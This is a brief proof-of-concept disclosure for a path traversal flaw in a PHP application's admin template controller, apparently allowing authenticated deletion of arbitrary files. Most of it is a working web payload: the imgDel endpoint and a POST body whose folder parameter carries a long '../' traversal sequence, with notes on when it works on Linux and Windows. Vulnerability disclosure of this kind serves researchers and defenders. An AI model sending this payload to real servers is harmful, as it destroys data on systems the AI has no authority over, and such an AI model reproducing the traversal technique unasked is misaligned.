## Proof of Concept
File:`application/admin/controller/Template.php `

Exploiting this vulnerability requires logging into the system.

payload:

```
admin/template/imgDel 

postï¼šfolder=../../../../../../../../../&filename=tmp/123
```

The method of writing output has been executed, but because the images directory does not exist by default, the exploit will fail. If the images directory exists, it can be exploited normally (linux platform).
If it is in windows is not affected by the images directory, you can use the vulnerability normally
